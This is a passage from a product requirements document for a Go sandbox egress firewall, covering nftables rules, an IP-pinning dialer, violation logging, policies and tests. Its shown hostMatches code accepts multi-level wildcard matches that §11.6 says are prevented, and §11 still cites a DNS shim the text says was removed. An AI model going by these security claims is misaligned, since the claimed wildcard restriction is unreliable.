    viol  chan<- FirewallViolation // buffered; drained by ViolationLogger goroutine
    runID string
}

func NewFirewallEngine(cfg SandboxFirewallConfig, viol chan<- FirewallViolation, runID string) *FirewallEngine {
    return &FirewallEngine{cfg: cfg, viol: viol, runID: runID}
}

// EvaluateConnection decides allow/deny and logs a violation on deny.
func (e *FirewallEngine) EvaluateConnection(hostname, ip string, port int, proto string, pid int) FirewallAction {
    if e.cfg.AllowAll {
        return ActionAllow
    }

    cidrHit := func(cidrs []string) bool {
        a, err := netip.ParseAddr(ip)
        if err != nil {
            return false
        }
        for _, c := range cidrs {
            if p, err := netip.ParsePrefix(c); err == nil && p.Masked().Contains(a) {
                return true
            }
        }
        return false
    }
    allowOverride := func() bool {
        for _, h := range e.cfg.ExtraAllowHosts {
            if hostname != "" && hostMatches(hostname, h) {
                return true
            }
        }
        return cidrHit(e.cfg.ExtraAllowCIDRs)
    }

    var action FirewallAction
    var triggered string

    if e.cfg.DenyAll {
        if allowOverride() {
            return ActionAllow // only per-invocation allow can save this
        }
        action, triggered = ActionDeny, "deny:invocation:deny-all"
    } else {
        if allowOverride() {
            return ActionAllow
        }
        action = e.cfg.Policy.Evaluate(hostname, ip)
        triggered = e.findTriggeredRule(hostname, ip, action)

        if action == ActionAllow { // apply per-invocation denies on top
            for _, h := range e.cfg.ExtraDenyHosts {
                if hostname != "" && hostMatches(hostname, h) {
                    action, triggered = ActionDeny, "deny:invocation:host:"+h
                    break
                }
            }
            if action == ActionAllow && cidrHit(e.cfg.ExtraDenyCIDRs) {
                action, triggered = ActionDeny, "deny:invocation:cidr"
            }
        }
    }

    if action == ActionDeny {
        v := FirewallViolation{
            RunID: e.runID, DestinationIP: ip, DestinationHost: hostname,
            DestinationPort: port, Proto: proto, TriggeredRule: triggered, PID: pid,
            ViolatedAt: time.Now().UTC().Format(time.RFC3339),
        }
        select {
        case e.viol <- v: // non-blocking send (buffered)
        default:
        }
    }
    return action
}

func hostMatches(hostname, pattern string) bool {
    if pattern == "*" {
        return true
    }
    if strings.HasPrefix(pattern, "*.") {
        return strings.HasSuffix(hostname, pattern[1:]) || hostname == pattern[2:]
    }
    return strings.EqualFold(hostname, pattern)
}

func (e *FirewallEngine) findTriggeredRule(hostname, ip string, action FirewallAction) string {
    rules := e.cfg.Policy.DenyRules
    if action == ActionAllow {
        rules = e.cfg.Policy.AllowRules
    }
    sorted := append([]FirewallRule(nil), rules...)
    sort.SliceStable(sorted, func(i, j int) bool { return sorted[i].Priority < sorted[j].Priority })
    for i := range sorted {
        if (hostname != "" && sorted[i].MatchesHost(hostname)) || sorted[i].MatchesIP(ip) {
            return fmt.Sprintf("%s:%s:%s", sorted[i].Action, sorted[i].Type, sorted[i].Value)
        }
    }
    return string(action) + ":default"
}
```

### 10.5 Host-Level nftables Enforcement (Docker Backend)

The Python `subprocess.run(["iptables", ...])` shell-out is replaced by programmatic rule construction over `google/nftables` (pure-Go netlink, no CLI, no CGO). A per-sandbox chain is added to the host inet table ahead of Docker's chains; CIDR allow rules `accept`, CIDR deny rules `log` + `drop`, and the default action is the chain's policy. Teardown deletes the chain. Any nftables error returns `nil` so the caller can fall back to the netguard dialer (FR-17).

```go
//go:build linux

package sandbox

import (
    "fmt"
    "net/netip"
    "sort"

    "github.com/google/nftables"
    "github.com/google/nftables/expr"
)

const chainPrefix = "TAG-SBX-"

// ApplyDockerFirewall programs a per-sandbox nftables chain for containerID.
// Returns the chain name, or "" if nftables is unavailable (caller falls back).
func ApplyDockerFirewall(runID string, policy FirewallPolicy, containerID string) (string, error) {
    conn, err := nftables.New()
    if err != nil {
        return "", err // nftables unavailable → caller uses netguard dialer
    }
    table := conn.AddTable(&nftables.Table{Family: nftables.TableFamilyINet, Name: "tag_fw"})
    chainName := chainPrefix + runID[:8]
    chain := conn.AddChain(&nftables.Chain{
        Name: chainName, Table: table,
        Type: nftables.ChainTypeFilter, Hooknum: nftables.ChainHookForward,
        Priority: nftables.ChainPriorityFilter,
    })

    add := func(cidr string, verdict expr.VerdictKind, log bool) {
        p, err := netip.ParsePrefix(cidr)
        if err != nil {
            return
        }
        exprs := daddrMatch(p) // build payload+cmp exprs for the destination prefix
        if log {
            exprs = append(exprs, &expr.Log{Data: []byte(fmt.Sprintf("[TAG-FW:%s] ", runID[:8]))})
        }
        exprs = append(exprs, &expr.Verdict{Kind: verdict})
        conn.AddRule(&nftables.Rule{Table: table, Chain: chain, Exprs: exprs})
    }

    sortByPriority(policy.AllowRules)
    for _, r := range policy.AllowRules {
        if r.Type == RuleCIDR {
            add(r.Value, expr.VerdictAccept, false)
        }
    }
    sortByPriority(policy.DenyRules)
    for _, r := range policy.DenyRules {
        if r.Type == RuleCIDR {
            add(r.Value, expr.VerdictDrop, true)
        }
    }
    // Default policy at end of chain
    if policy.DefaultAction == ActionDeny {
        conn.AddRule(&nftables.Rule{Table: table, Chain: chain, Exprs: []expr.Any{
            &expr.Log{Data: []byte(fmt.Sprintf("[TAG-FW:%s] ", runID[:8]))},
            &expr.Verdict{Kind: expr.VerdictDrop},
        }})
    }
    if err := conn.Flush(); err != nil { // commit the netlink batch
        return "", err
    }
    return chainName, nil
}

// RemoveDockerFirewall deletes the per-sandbox chain. Called via defer / signal.
func RemoveDockerFirewall(chainName string) {
    conn, err := nftables.New()
    if err != nil {
        return
    }
    table := &nftables.Table{Family: nftables.TableFamilyINet, Name: "tag_fw"}
    conn.DelChain(&nftables.Chain{Name: chainName, Table: table})
    _ = conn.Flush()
}

func sortByPriority(rs []FirewallRule) {
    sort.SliceStable(rs, func(i, j int) bool { return rs[i].Priority < rs[j].Priority })
}
```

### 10.6 Userspace IP-Pin Dialer Enforcement (Restricted Subprocess and off-Linux Fallback)

The Python DNS-intercept shim (monkeypatching `socket.getaddrinfo`, a `PYTHONSTARTUP` script, and a Unix-domain-socket check server) is a Python-runtime-specific hack that does **not** port to a static Go binary. It is replaced by `internal/netguard`'s connect-time IP-pin dialer: a `DialContext` that resolves the destination, pins the resolved IP, evaluates it through `FirewallEngine.EvaluateConnection`, and only then connects — the same "connect-time IP-pin + redirect-revalidate" primitive TAG already uses for SSRF protection. For the restricted-subprocess backend, the child's outbound traffic is routed through this dialer (or a loopback proxy backed by it); for container tiers where no host nftables is available, the gVisor netstack (runsc) provides a fully userspace network stack. Where neither can be applied (an arbitrary non-Go subprocess making raw syscalls), TAG prints a documented reduced-enforcement warning (see §11).

```go
package netguard

import (
    "context"
    "fmt"
    "net"
)

// FirewallDialer returns a DialContext that pins and validates the destination
// IP against the active policy before connecting (replaces the Python DNS shim).
func FirewallDialer(engine *sandbox.FirewallEngine, pid int) func(context.Context, string, string) (net.Conn, error) {
    base := &net.Dialer{}
    return func(ctx context.Context, network, address string) (net.Conn, error) {
        host, portStr, _ := net.SplitHostPort(address)
        ips, err := net.DefaultResolver.LookupNetIP(ctx, "ip", host)
        if err != nil || len(ips) == 0 {
            return nil, fmt.Errorf("resolve %s: %w", host, err)
        }
        ip := ips[0] // pinned IP — connection is made to exactly this address
        port := atoiSafe(portStr)
        if engine.EvaluateConnection(host, ip.String(), port, network, pid) == sandbox.ActionDeny {
            return nil, fmt.Errorf("connection blocked by TAG firewall: %s:%d", host, port)
        }
        return base.DialContext(ctx, network, net.JoinHostPort(ip.String(), portStr))
    }
}
```

Because evaluation runs in-process (same address space as the SQLite writer goroutine), there is no cross-process check server to secure — a structural simplification over the Python Unix-socket design.

### 10.7 Violation Logger Goroutine

The Python daemon `threading.Thread` + `queue.Queue` + poison-pill becomes a goroutine ranging over a buffered channel; closing the channel (instead of a `None` sentinel) signals shutdown. SQLite writes go through the `modernc.org/sqlite` driver in WAL mode.

```go
package sandbox

import (
    "database/sql"
    "encoding/json"
    "os"
    "sync"

    _ "modernc.org/sqlite"
)

// ViolationLogger drains a buffered channel of FirewallViolation and writes
// each to SQLite + JSONL without blocking the enforcement path.
type ViolationLogger struct {
    dbPath, jsonlPath string
    ch                <-chan FirewallViolation
    done              sync.WaitGroup
}

func StartViolationLogger(dbPath, jsonlPath string, ch <-chan FirewallViolation) *ViolationLogger {
    l := &ViolationLogger{dbPath: dbPath, jsonlPath: jsonlPath, ch: ch}
    l.done.Add(1)
    go l.run()
    return l
}

func (l *ViolationLogger) run() {
    defer l.done.Done()

    db, err := sql.Open("sqlite", l.dbPath+"?_pragma=busy_timeout(5000)&_pragma=journal_mode(WAL)")
    if err != nil {
        return
    }
    defer db.Close()
    ensureViolationsSchema(db)

    fh, err := os.OpenFile(l.jsonlPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
    if err != nil {
        return
    }
    defer fh.Close()

    enc := json.NewEncoder(fh)
    for v := range l.ch { // ranges until the channel is closed (shutdown signal)
        v.ID = "sfv_" + randHex(8)
        _, _ = db.Exec(
            `INSERT OR IGNORE INTO sandbox_firewall_violations
               (id, run_id, proto, destination_host, destination_ip,
                destination_port, triggered_rule, pid, violated_at)
             VALUES (?,?,?,?,?,?,?,?,?)`,
            v.ID, v.RunID, v.Proto, v.DestinationHost, v.DestinationIP,
            v.DestinationPort, v.TriggeredRule, v.PID, v.ViolatedAt)
        _ = enc.Encode(v) // one JSON object per line, flushed by the file writer
    }
}

// Wait blocks until the channel is closed and all pending violations are flushed.
func (l *ViolationLogger) Wait() { l.done.Wait() }
```

### 10.8 Built-in Named Policies

Built-in policies are defined as Go package-level values and seeded into SQLite with `INSERT OR IGNORE` on the first `internal/store` migration:

```go
package sandbox

type builtinRule struct {
    Action FirewallAction
    Type   RuleType
    Value  string
}

type builtinPolicy struct {
    DefaultAction FirewallAction
    Description   string
    Rules         []builtinRule
}

var BuiltinPolicies = map[string]builtinPolicy{
    "open": {
        DefaultAction: ActionAllow,
        Description:   "No restrictions — allow all egress (default behaviour).",
    },
    "restricted": {
        DefaultAction: ActionDeny,
        Description:   "Deny all egress. No hosts allowed by default.",
    },
    "pypi": {
        DefaultAction: ActionDeny,
        Description:   "Allow PyPI, GitHub, and common Linux package CDNs.",
        Rules: []builtinRule{
            {ActionAllow, RuleHost, "pypi.org"},
            {ActionAllow, RuleHost, "files.pythonhosted.org"},
            {ActionAllow, RuleHost, "api.github.com"},
            {ActionAllow, RuleHost, "github.com"},
            {ActionAllow, RuleWildcard, "*.github.com"},
            {ActionAllow, RuleWildcard, "*.githubusercontent.com"},
            {ActionAllow, RuleHost, "cdn.jsdelivr.net"},
            {ActionAllow, RuleHost, "registry.npmjs.org"},
            {ActionAllow, RuleHost, "registry.yarnpkg.com"},
            {ActionAllow, RuleHost, "dl-cdn.alpinelinux.org"},
            {ActionAllow, RuleHost, "deb.debian.org"},
            {ActionAllow, RuleHost, "security.debian.org"},
            {ActionAllow, RuleHost, "archive.ubuntu.com"},
            {ActionAllow, RuleHost, "security.ubuntu.com"},
            {ActionAllow, RuleWildcard, "*.cloudfront.net"},
        },
    },
    "custom": {
        DefaultAction: ActionAllow,
        Description:   "User-defined policy (empty placeholder — add rules with firewall add).",
    },
}
```

### 10.9 Integration with the sandbox `Run` path

The sandbox `Spec` (PRD-093 §10.3) gains an optional `*SandboxFirewallConfig`; the logger goroutine is started before enforcement and stopped by closing the channel. Chain teardown / logger shutdown run via `defer` so they fire on every exit path including panic (FR-05).

```go
func RunWithFirewall(ctx context.Context, backend Backend, spec Spec, fw *SandboxFirewallConfig) (Result, error) {
    runID := spec.InvokingRunID
    if fw == nil {
        return backend.Run(ctx, spec) // no firewall requested
    }

    viol := make(chan FirewallViolation, 256) // buffered → non-blocking sends
    dbPath := filepath.Join(tagHome(), "runtime", "tag.sqlite3")
    jsonlPath := filepath.Join(tagHome(), "runtime", "sandbox-firewall.jsonl")
    logger := StartViolationLogger(dbPath, jsonlPath, viol)
    defer func() { close(viol); logger.Wait() }() // shutdown signal + drain

    engine := NewFirewallEngine(*fw, viol, runID)

    switch backend.Name() {
    case "docker":
        chain, err := ApplyDockerFirewall(runID, fw.Policy, "" /* container id set at start */)
        if err == nil && chain != "" {
            defer RemoveDockerFirewall(chain) // unconditional teardown
        } else {
            // nftables unavailable → fall back to the netguard dialer (FR-17)
            spec = spec.WithDialer(netguard.FirewallDialer(engine, 0))
        }
    default: // restricted-subprocess and off-Linux
        spec = spec.WithDialer(netguard.FirewallDialer(engine, 0))
    }
    return backend.Run(ctx, spec)
}
```

Signal-driven cleanup is anchored at the process root via `signal.NotifyContext(ctx, os.Interrupt, syscall.SIGTERM)`; cancelling that context unwinds the `defer RemoveDockerFirewall` on SIGINT/SIGTERM as well as normal return.

### 10.10 Profile YAML Integration

The existing profile YAML `execution` block is extended with a `network` key:

```yaml
# ~/.tag/profiles/coder/profile.yaml
name: coder
model: claude-sonnet-4-6

execution:
  sandbox: true
  backend: docker
  image: python:3.12-slim
  timeout: 120
  network: coder          # references a stored firewall policy named 'coder'
  # OR: network: restricted|open|pypi|custom
```

The profile YAML is parsed by `internal/config` (koanf + yaml.v3). Profile loading in `internal/cli` calls `LoadFirewallPolicyForProfile(ctx, db, profileName)` which queries `sandbox_firewall_policies` and `sandbox_firewall_rules` (via `internal/store`) to build a `FirewallPolicy`.

---

## 11. Security Considerations

1. **Chain cleanup is safety-critical.** Orphaned nftables chains containing drop rules can permanently block outbound traffic from subsequent Docker containers that happen to share a bridge. The cleanup path is anchored with `defer RemoveDockerFirewall(...)` plus a `signal.NotifyContext(SIGTERM/SIGINT)` root context so it runs on every exit path including panic. The chain name `TAG-SBX-<run_id[:8]>` is unique per run; a `tag sandbox firewall purge` command performs garbage collection of any stale chains.

2. **Localhost CIDR is never blocked.** `FirewallRule.Validate()` rejects rules whose CIDR range contains `127.0.0.0/8` or `::1/128`. Blocking localhost inside the sandbox breaks local IPC sockets, loopback services, and package managers that use localhost proxies.

3. **Violation log does not record payload data.** `FirewallViolation` records destination host, IP, port, and rule — never the content of the blocked request. This prevents the violation log from becoming a secondary exfiltration channel (e.g., a process leaking data via DNS query names).

4. **Enforcement runs in-process — no injected shim.** The netguard IP-pin dialer evaluates connections inside the TAG process's address space; there is no Python interpreter to monkeypatch, no `PYTHONSTARTUP` injection, and no cross-process Unix-socket check server to secure — removing an entire class of shim-tampering and socket-permission concerns present in the Python design.

5. **nftables requires `CAP_NET_ADMIN`.** TAG's Docker backend programs nftables via netlink as the user running `tag`. Where the user lacks `CAP_NET_ADMIN` (non-root without sudo) or nftables is unavailable, enforcement falls back to the netguard connect-time IP-pin dialer with a printed warning. That fallback is weaker (userspace only, bypassable by a process that issues raw `connect(2)` syscalls outside the Go dialer — e.g. via a C extension) and is documented as such; gVisor netstack is the stronger container-tier option.

6. **Wildcard rules are limited to single-level prefix matching.** `*.github.com` matches `api.github.com` but not `evil.api.github.com` to prevent overly broad allow rules. Users who need deeper wildcard matching must enumerate each prefix explicitly.

7. **CIDR collision between allow and deny.** When a destination IP matches both an allow CIDR and a deny CIDR, the allow rule wins (consistent with E2B semantics). This is documented in the CLI `--help` text and in `tag sandbox firewall show` output which displays the effective precedence.

8. **The `pypi` built-in policy's CDN CIDRs may change.** PyPI and GitHub use dynamic CDN IPs. The `pypi` policy allows by hostname (resolved at connection time by the DNS intercept shim), not by static CIDR, to avoid false positives from CDN IP rotation. Users who need strict IP-based allow lists should define a `custom` policy with specific CIDRs.

9. **Log file permissions.** `sandbox-firewall.jsonl` is created with mode `0o600` (owner-readable only). The SQLite database already uses `0o600` via TAG's `open_db()`. Violation data (destination IPs) could reveal browsing/API patterns and must not be world-readable.

10. **nftables log statement requires kernel support.** The nftables `log` statement (used to capture kernel-level violation events alongside the userspace dialer) requires `nf_log` support in the kernel. If unavailable, only `drop` rules are applied; kernel-level logging is omitted. The userspace dialer's violation log is unaffected.

---

## 12. Testing Strategy

### 12.1 Unit Tests

File: `internal/sandbox/firewall_test.go` — Go standard `testing`, table-driven.

| Test | Method |
|------|--------|
| `FirewallRule.Validate` accepts valid CIDRs | Table of valid CIDR strings; assert `err == nil` |
| `FirewallRule.Validate` rejects malformed CIDRs | Assert non-nil `error` for `"10.0.x.y/24"`, `"999.0.0.0/8"`, `""` |
| `FirewallRule.Validate`/policy save rejects localhost CIDRs | Assert error for `"127.0.0.1/32"`, `"127.0.0.0/8"` |
| `FirewallRule.MatchesHost` — exact match | `api.github.com` matches `api.github.com` |
| `FirewallRule.MatchesHost` — wildcard match | `api.github.com` matches `*.github.com` |
| `FirewallRule.MatchesHost` — wildcard non-match | `evil.api.github.com` does NOT match `*.github.com` |
| `FirewallRule.MatchesIP` — in range | `10.0.0.5` matches `10.0.0.0/8` (via `netip.Prefix.Contains`) |
| `FirewallRule.MatchesIP` — outside range | `192.168.1.1` does not match `10.0.0.0/8` |
| `FirewallPolicy.Evaluate` — allow wins over deny-all | Allow rule for host, deny-all CIDR: returns `ActionAllow` |
| `FirewallPolicy.Evaluate` — default deny with no matching rule | Returns `ActionDeny` |
| `FirewallPolicy.Evaluate` — default allow with no matching deny | Returns `ActionAllow` |
| `FirewallEngine.EvaluateConnection` — deny-all + per-invocation allow | Specific host allowed, others denied |
| `FirewallEngine.EvaluateConnection` — violation sent on deny | Receive one `FirewallViolation` from the channel after a blocked call |
| `BuiltinPolicies` keys — all four present and valid | Smoke test |
| `hostMatches` — star pattern | `*` matches any host |

### 12.2 Integration Tests

File: `internal/sandbox/firewall_integration_test.go`, gated by `//go:build integration` and skipped unless Docker/nftables are available (env-guarded):

| Test | Method |
|------|--------|
| netguard dialer blocks denied host | Run restricted sandbox with `--deny-host httpbin.org`; a `DialContext` to `httpbin.org:80` returns an error; assert violation logged |
| netguard dialer allows permitted host | Same setup with `--allow-host pypi.org --deny-all`; dial to `pypi.org:443` succeeds |
| nftables chain created and removed | After Docker sandbox run with `--deny-all`, assert chain `TAG-SBX-<id>` absent when listing the `tag_fw` table via `google/nftables` |
| Violation row written to SQLite | Run sandbox with blocked destination; query `sandbox_firewall_violations` by `run_id`; assert 1 row |
| Violation row written to JSONL | Same run; read `sandbox-firewall.jsonl`; decode JSON; assert `destination_ip` present |
| `pypi` policy allows `pip install` | `tag sandbox run --network pypi --code "pip install requests --quiet"` exits 0 |
| `restricted` policy blocks all | `tag sandbox run --network restricted --code "curl https://example.com"` exits non-zero; violation logged |
| `firewall test` dry-run no TCP connection | `tag sandbox firewall test --policy restricted --destination api.github.com` produces BLOCKED; assert only a DNS lookup, no `Dial` (inject a fake dialer that records calls) |
| Chain cleanup on SIGINT | Cancel the root `signal.NotifyContext` during a run; assert chain absent within 2s |
| `ViolationLogger` goroutine shutdown | Close the channel; assert `logger.Wait()` returns within 1s |

### 12.3 Performance Tests

File: `internal/sandbox/firewall_bench_test.go` — Go benchmarks (`go test -bench`).

| Test | Target | Method |
|------|--------|--------|
| Firewall startup overhead (Docker/nftables) | < 200 ms | Benchmark 50 `ApplyDockerFirewall` calls; assert p95 < 200 ms |
| Firewall startup overhead (netguard dialer) | < 10 ms | Benchmark 50 dialer setups; assert p95 < 10 ms |
| `EvaluateConnection` throughput | > 100,000 evaluations/sec | `BenchmarkEvaluateConnection` with a 10-rule policy |
| Violation logger throughput | > 5,000 violations/sec | Flood the channel with 10,000 violations; measure flush time |
| Chain removal latency | < 1 s for 1000-rule chain | Benchmark `RemoveDockerFirewall` with a 1000-rule chain |

---

## 13. Acceptance Criteria

| ID | Criterion | Verification |
|----|-----------|--------------|
| AC-01 | `tag sandbox run --code "python -c 'import socket; socket.connect((\"8.8.8.8\", 53))'" --deny-all` exits non-zero and prints "BLOCKED" in output. | Integration test |
| AC-02 | `tag sandbox run --code "..." --deny-all --allow-host pypi.org` — a TCP connection to pypi.org:443 succeeds; a TCP connection to google.com:443 is blocked. | Integration test |
| AC-03 | After `tag sandbox firewall add --profile coder --allow "pypi.org" --deny "*"`, running `tag sandbox run --profile coder --code "..."` automatically applies the stored policy. | Integration test |
| AC-04 | `tag sandbox firewall list` outputs all stored policies plus the four built-in policies in a formatted table. | CLI test |
| AC-05 | `tag sandbox firewall test --policy restricted --destination google.com` prints "Result: BLOCKED" and exits 0 (test result, not an error). | CLI test |
| AC-06 | `tag sandbox firewall test --policy pypi --destination pypi.org` prints "Result: ALLOWED". | CLI test |
| AC-07 | Every blocked connection in a Docker sandbox produces a row in `sandbox_firewall_violations` with correct `run_id`, `destination_ip`, `triggered_rule`, and `violated_at`. | SQLite assertion test |
| AC-08 | Every blocked connection produces a valid JSON object appended to `sandbox-firewall.jsonl` within 500 ms. | File assertion test |
| AC-09 | After sandbox exit (normal, SIGINT, or panic), listing the `tag_fw` nftables table (via `google/nftables` or `nft list ruleset`) shows no `TAG-SBX-*` chain. | Integration assertion test |
| AC-10 | `tag sandbox run --network open` on a profile with `network: restricted` in YAML overrides the profile policy and allows all egress. | Integration test |
| AC-11 | `tag sandbox firewall add --profile coder --allow "127.0.0.0/8" --deny "*"` exits non-zero with error message "Cannot block or explicitly allow localhost CIDR 127.0.0.0/8". | CLI test |
| AC-12 | `tag sandbox firewall add --profile coder --allow "*.github.com" --deny "*"` accepts the wildcard rule; `tag sandbox firewall show coder` displays it as `wildcard  *.github.com`. | CLI test |
| AC-13 | On macOS (no nftables), `tag sandbox run --deny-all` prints a warning about the reduced-enforcement fallback and still blocks connections via the netguard IP-pin dialer. | Manual macOS test |
| AC-14 | `tag sandbox firewall violations --run-id <id>` returns all violations for that run in table format; `--json` returns a valid JSON array. | CLI test |
| AC-15 | The single static binary (`CGO_ENABLED=0`) allows `tag sandbox firewall` commands to parse and validate on a host with neither nftables nor Docker present (policy management is pure-Go; enforcement degrades with a warning). | `go build ./...` with `CGO_ENABLED=0`; `tag sandbox firewall list` exits 0 on a bare host |

---

## 14. Dependencies

| Dependency | Type | Notes |
|------------|------|-------|
| PRD-028 (Sandbox Code Execution) | Blocking | This PRD extends `internal/sandbox` and the `sandbox_runs` table from PRD-028. PRD-028 must be merged first. |
| `github.com/google/nftables` | Go module (Apache-2.0) | Pure-Go netlink; host-level egress enforcement on Linux. Graceful fallback to the netguard dialer when the kernel subsystem is absent. |
| `net/netip` (Go stdlib) | Required | CIDR parsing (`ParsePrefix`) and matching (`Prefix.Contains`); replaces Python `ipaddress`. |
| Go goroutines + channels (stdlib) | Required | ViolationLogger goroutine draining a buffered channel; replaces `threading`/`queue`. |
| `internal/netguard` (connect-time IP-pin dialer) | Internal | Userspace enforcement fallback; replaces the Python `socket` DNS-intercept shim. |
| `modernc.org/sqlite` | Go module (BSD-3, pure-Go) | Project-wide store (WAL, `CGO_ENABLED=0`) for firewall policies/rules/violations via `internal/store`. |
| `github.com/docker/docker` (moby client) | Go module (Apache-2.0) | Docker backend container lifecycle; host nftables applied around it. |
| `google/gvisor` (runsc) | Optional runtime | Container-tier userspace netstack option where host nftables is unavailable. |
| PRD-013 (Agent Tracing) | Optional | Violation events emitted as OTel spans (`go.opentelemetry.io/otel`) if tracing is configured. |
| PRD-034 (Secret Scanning) | Reference | Path-validation patterns referenced for credential-path exclusions; no code dependency. |
| PRD-005 (Execution Backend Selection) | Reference | Profile YAML `execution` block; `network` key extends existing schema (parsed via koanf). |
| Docker Engine | Optional runtime | Required for Docker backend. Restricted (landlock+seccomp) subprocess backend works without Docker. |

---

## 15. Open Questions

| # | Question | Owner | Resolution Target |
|---|----------|-------|-------------------|
| OQ-1 | The `google/nftables` `inet` family covers IPv4 and IPv6 in one table; should v1 actually program IPv6 (`::/0`) prefixes and validate IPv6 in the netguard dialer, or defer IPv6 enforcement? The threat model applies equally to IPv6, but IPv6 test coverage adds surface area. | Platform team | Before v1 merge |
| OQ-2 | Should the `pypi` built-in policy list be maintained as a static constant or fetched from a remote source (e.g., a TAG-managed JSON file) to keep pace with CDN IP changes? A remote fetch introduces a network dependency at startup. | Security team | v1.1 |
| OQ-3 | Should violations be emitted to the existing `tracing.py` span store as child spans of the current agent run, or only to the dedicated `sandbox_firewall_violations` table? Using the span store would allow `tag trace show` to surface violations inline. | Observability team | Before v1 merge |
| OQ-4 | The netguard IP-pin dialer only governs connections made through the Go dialer. A process issuing a raw `connect(2)` syscall (e.g. a C extension) bypasses it. Should we document this limitation explicitly, or pair it with an `elastic/go-seccomp-bpf` syscall filter on the restricted backend to block un-dialed `connect`? | Security team | v1 docs |
| OQ-5 | Should `tag sandbox firewall add` support importing rules from a YAML file (e.g., `--from-file network-policy.yaml`) for teams managing policies in version control? This aligns with the profile YAML pattern. | CLI team | v1.1 |
| OQ-6 | Should the built-in `custom` policy be removed in favour of requiring users to always create a named policy? The `custom` placeholder may cause confusion when multiple users on the same machine both try to use `--network custom`. | UX team | Before v1 merge |
| OQ-7 | What is the right behaviour when nftables cannot be programmed (permissions error) AND the netguard dialer cannot be applied (an arbitrary non-Go subprocess)? Fail-open (allow all with warning) or fail-closed (abort the sandbox run)? | Security team | Before v1 merge |
| OQ-8 | Should violation data be included in `tag sandbox run --json` output, or only available via `tag sandbox firewall violations --run-id`? Including it in `run` output makes scripting easier but increases the output payload size. | CLI team | v1 |

---

## 16. Complexity and Timeline

**Overall estimate:** M (7-10 engineering days)

### Phase 1 — Core Firewall Engine (Days 1-3)

- Implement `FirewallRule`, `FirewallPolicy`, `SandboxFirewallConfig`, `FirewallEngine` structs + typed constants in `internal/sandbox/firewall.go` (`net/netip` for CIDR)
- Implement `BuiltinPolicies` package values
- Implement `FirewallPolicy.Evaluate` with full precedence logic
- Add the SQLite DDL (`sandbox_firewall_policies`, `sandbox_firewall_rules`, `sandbox_firewall_violations`) to the `internal/store` migration runner
- Seed built-in policies with `INSERT OR IGNORE`
- Table-driven unit tests for all rule matching and policy evaluation
- **Deliverable:** `FirewallEngine.EvaluateConnection` is tested and correct; no CLI yet

### Phase 2 — Enforcement Backends (Days 4-6)

- Implement `ApplyDockerFirewall`/`RemoveDockerFirewall` over `google/nftables` (netlink, Linux build target)
- Implement the `ViolationLogger` goroutine draining a buffered channel to SQLite + JSONL
- Implement the `internal/netguard` connect-time IP-pin `DialContext` for the restricted-subprocess/off-Linux fallback
- Wire enforcement into the Docker and restricted backends' `Run`; add `RunWithFirewall` starting/stopping the logger via channel close
- Anchor chain cleanup with `defer` + `signal.NotifyContext` (SIGINT/SIGTERM/panic)
- Integration tests (`//go:build integration`): netguard dialer, nftables chain lifecycle, violation logging
- **Deliverable:** `RunWithFirewall(...)` enforces rules end-to-end

### Phase 3 — CLI Surface (Days 7-9)

- Add `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, `--deny-all`, `--allow-all`, `--network` flags to the `sandbox run` cobra command in `internal/cli`
- Implement the `firewall add/list/show/remove/test/violations` cobra subcommands
- Profile YAML `network` key loading via `LoadFirewallPolicyForProfile` (koanf + `internal/store`)
- Wire `--network` through to `RunWithFirewall` via `SandboxFirewallConfig`
- CLI tests for all 7 subcommands
- **Deliverable:** Full `tag sandbox firewall` CLI surface functional

### Phase 4 — Polish and Performance (Day 10)

- OTel span emission for violations via `internal/obs` (PRD-013 integration, if merged)
- Go benchmarks; optimize `EvaluateConnection` for the hot path
- Off-Linux (macOS/Windows) fallback testing and reduced-enforcement warning messages
- Documentation: cobra `--help` text, `docs/sandbox-firewall.md` (one-page reference)
- Final acceptance criteria sweep
- **Deliverable:** All 15 AC items passing; performance targets met; ready for merge

---

*End of PRD-094*

